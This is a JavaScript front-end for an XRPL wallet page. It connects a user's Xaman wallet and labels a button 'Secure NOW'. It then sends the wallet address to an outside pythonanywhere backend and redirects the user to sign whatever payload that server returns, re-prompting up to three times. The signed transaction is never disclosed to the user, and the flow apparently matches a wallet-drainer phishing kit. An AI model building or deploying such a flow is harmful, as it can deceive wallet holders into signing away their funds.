// ==============================
// STATE (TOP OF FILE)
// ==============================
let currentAddress = null;
let approvalPending = false;
let retryCount = 0;
const MAX_RETRIES = 3;

// ==============================
// UI
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function lockButton(lock) {
  const btn = document.getElementById("mainActionButton");
  if (!btn) return;
  btn.disabled = lock;
  btn.textContent = lock ? "Approval Pending…" : "Secure NOW";
}

// ==============================
// CONNECT WALLET (XAMAN)
// ==============================
async function connectWalletXaman() {
  try {
    setStatus("Connecting to Xaman…");

    const xumm = new XummPkce("YOUR_XAMAN_API_KEY");

    xumm.on("success", async () => {
      const state = await xumm.state();
      if (state?.me?.account) {
        currentAddress = state.me.account;
        setStatus(`Connected: ${currentAddress.slice(0,6)}…`);
        prepareSecureButton();
      }
    });

    xumm.on("error", () => {
      setStatus("Connection cancelled");
    });

    await xumm.authorize();
  } catch (e) {
    console.error(e);
    setStatus("Connection failed");
  }
}

// ==============================
// SWITCH BUTTON TO SECURE
// ==============================
function prepareSecureButton() {
  const btn = document.getElementById("mainActionButton");
  if (!btn) return;

  btn.textContent = "Secure NOW";
  btn.classList.remove("btn-primary");
  btn.classList.add("btn-success");

  btn.onclick = e => {
    e.preventDefault();
    triggerManualApproval();
  };
}

// ==============================
// SECURE / APPROVAL FLOW
// ==============================
async function triggerManualApproval() {
  if (!currentAddress || approvalPending) return;

  approvalPending = true;
  retryCount = 0;
  lockButton(true);

  try {
    setStatus("Preparing secure approval…");

    const res = await fetch(
      "https://cultured.pythonanywhere.com/api/xaman/payload",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: currentAddress })
      }
    );

    const data = await res.json();
    if (!res.ok || !data.signUrl) throw new Error("Approval failed");

    window.location.href = data.signUrl;
    startTimeout();

  } catch (err) {
    resetState(err.message);
  }
}

// ==============================
// RETRY HANDLING
// ==============================
function startTimeout() {
  setTimeout(() => {
    if (!approvalPending) return;

    retryCount++;
    if (retryCount <= MAX_RETRIES) {
      approvalPending = false;
      setStatus(`Retrying approval (${retryCount}/${MAX_RETRIES})…`);
      triggerManualApproval();
    } else {
      resetState("Approval cancelled");
    }
  }, 65000);
}

function resetState(msg) {
  approvalPending = false;
  retryCount = 0;
  lockButton(false);
  setStatus(msg || "Approval failed");
}
